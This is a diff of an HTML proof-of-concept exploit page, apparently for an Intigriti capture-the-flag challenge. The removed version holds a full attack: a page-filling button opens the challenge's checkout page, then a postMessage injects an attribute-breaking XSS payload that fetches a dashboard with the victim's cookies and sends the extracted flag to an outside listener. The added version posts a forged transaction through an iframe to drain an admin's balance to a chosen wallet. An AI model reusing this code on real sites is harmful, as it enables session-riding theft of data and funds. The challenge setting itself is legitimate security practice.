@@ -1,69 +1,37 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Intigriti Challenge</title>
-    <style>
-        /* A giant button to ensure the bot clicks it */
-        button { position: absolute; top:0; left:0; width:100%; height:100%; font-size: 50px; background: #0f0; border: none; cursor: pointer; }
-    </style>
+    <title>PostMessage Exploit PoC</title>
 </head>
 <body>
-    <button onclick="pwn()">CLICK ME TO WIN</button>
+    <h1>"Following the trail of coins..."</h1>
+    
+    <iframe id="target" src="https://YOUR_CHALLENGE_URL/checkout.html?currency=BTC&price=1" width="500" height="500"></iframe>
 
     <script>
-        // CONFIGURATION
-        const BASE = 'https://challenge-0126.intigriti.io';
-        const LISTENER = 'https://llarwiokdwzfybewzwy6nhoc73du1lpa.oastify.com/';
+        // Step 2: Wait for the iframe to load
+        document.getElementById('target').onload = function() {
+            console.log("Iframe loaded, preparing payload...");
+            
+            var targetFrame = document.getElementById('target').contentWindow;
 
-        function pwn() {
-            // 1. Open the checkout page in a new popup window
-            // This ensures cookies are sent correctly (unlike iframes)
-            const win = window.open(BASE + '/checkout.html?currency=1337COIN&price=1', '_blank');
+            // Step 3: Craft the malicious transaction data
+            var maliciousPayload = {
+                type: 'submitTransaction',
+                transaction: {
+                    currency: '1337COIN', // You can change to ETH or XMR
+                    amount: 1337,    // A high amount to drain the admin
+                    toAddress: '10970063d33e32396bb80753a2b902d568' // Put your CTF user's wallet address here
+                }
+            };
 
+            // Step 4: Send the message! The '*' means we send it to any origin.
+            // We use a slight delay to ensure target JS is fully initialized.
             setTimeout(() => {
-                // --- THE PAYLOAD ---
-                // 1. We fetch dashboard.html WITH credentials (cookies) to get the real flag.
-                // 2. We use location.href to send the flag (bypasses most firewalls).
-                
-                const code = `
-                    fetch('/dashboard.html', {credentials: 'include'})
-                    .then(r => r.text())
-                    .then(html => {
-                        // Find the flag using Regex
-                        var match = html.match(/INTIGRITI\\{.*?\\}/);
-                        var flag = match ? match[0] : 'NO_FLAG_FOUND';
-                        
-                        // Send it home
-                        window.location.href = '${LISTENER}/?flag=' + btoa(flag);
-                    })
-                `;
-
-                // Remove newlines to fit in the attribute
-                const flatCode = code.replace(/\n/g, ' ');
-
-                // Break out of the title attribute
-                const xss = `"><img src=x onerror="${flatCode}">`;
-
-                // 2. Send the malicious transaction
-                // We use 1337COIN because the Admin has a balance for it.
-                win.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        currency: '1337COIN', 
-                        amount: 1337, 
-                        toAddress: xss
-                    }
-                }, '*');
-
-                // 3. FORCE Redirect to MarketWatch
-                // We wait 2.5 seconds to allow the transaction to save.
-                // Even if the 'alert' box is stuck open, forcing location usually overrides it in popups.
-                setTimeout(() => {
-                    win.location = BASE + '/marketwatch.html';
-                }, 2500);
-
-            }, 2000);
-        }
+                targetFrame.postMessage(maliciousPayload, '*');
+                console.log("Payload sent!");
+            }, 1000); 
+        };
     </script>
 </body>
 </html>
